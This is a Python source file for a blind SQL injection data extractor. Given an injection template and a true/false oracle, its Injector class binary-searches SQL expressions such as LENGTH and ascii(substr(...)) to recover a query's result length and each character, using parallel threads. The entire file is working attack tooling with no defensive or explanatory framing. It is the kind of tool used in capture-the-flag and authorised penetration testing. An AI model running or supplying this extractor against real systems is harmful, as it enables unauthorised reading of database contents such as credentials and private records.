from typing import Callable
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

INT_MAX = 2147483647

class Injector:
    @dataclass
    class Templates:
        inject_template: str
        search_template: str = "(({target}) < {value})"
        length_template: str = "LENGTH( ({}) )"
        ith_char_template: str = "ascii(substr(({target}), {value}, 1))"



    def __init__(self, templates: Templates, checker: 'Callable[[str], bool]', true_injection: bool = True, int_max = INT_MAX, max_threads = 8):
        self.templates = templates
        self.checker = checker
        self.int_max = int_max
        self.max_threads = max_threads
    
    def check(self, target: str) -> bool:
        return self.checker(self.templates.inject_template.format(target))

    def binary_search(self, search_target: str, lower: int, upper: int) -> int:
        mid = 0
        while lower < upper:
            mid = (lower + upper + 1) // 2
            search = self.templates.search_template.format(target=search_target, value=mid)
            if self.check(search):
                upper = mid - 1
            else:
                lower = mid
        return lower
    
    def get_length(self, target: str) -> int:
        return self.binary_search(self.templates.length_template.format(target), 0, self.int_max)

    def get_str(self, target) -> str:
        length = self.get_length(target)
        print(f"Length: {length}")
        res = bytearray([0] * length)
        # for i in tqdm(range(length)):
        #     i_target = f"ascii(substr(({target}),{i+1},1))"
        #     c = self.binary_search(i_target, 0, 255)
        #     res.append(c)
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = { executor.submit(self.binary_search, 
                                        self.templates.ith_char_template.format(target=target, value=i+1), 
                                        0, 255)
                        : i for i in range(length) }
            for future in tqdm(as_completed(futures)):
                c = future.result()
                res[futures[future]] = c
        return res.decode()

    def get_int(self, target: str, int_max: int | None = None):
        if int_max is None: int_max = self.int_max

        return self.binary_search(target, -int_max, int_max)